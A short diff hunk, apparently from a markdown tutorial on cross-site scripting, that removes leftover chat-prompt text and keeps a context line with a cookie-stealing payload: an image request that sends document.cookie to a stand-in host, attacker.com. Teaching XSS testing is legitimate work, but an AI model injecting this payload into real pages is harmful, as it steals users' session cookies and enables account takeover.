@@ -50,10 +50,6 @@ Instead of `alert()`, use:
 new Image().src="http://attacker.com/log?data="+encodeURIComponent(document.cookie);
 ```
 
-Continue From Testing With Delayed Callbacks and append dont write from the start
-
-
-Here’s the continuation from **Testing with Delayed Callbacks**, focusing on advanced exploitation and mitigation:
 
 ---
 
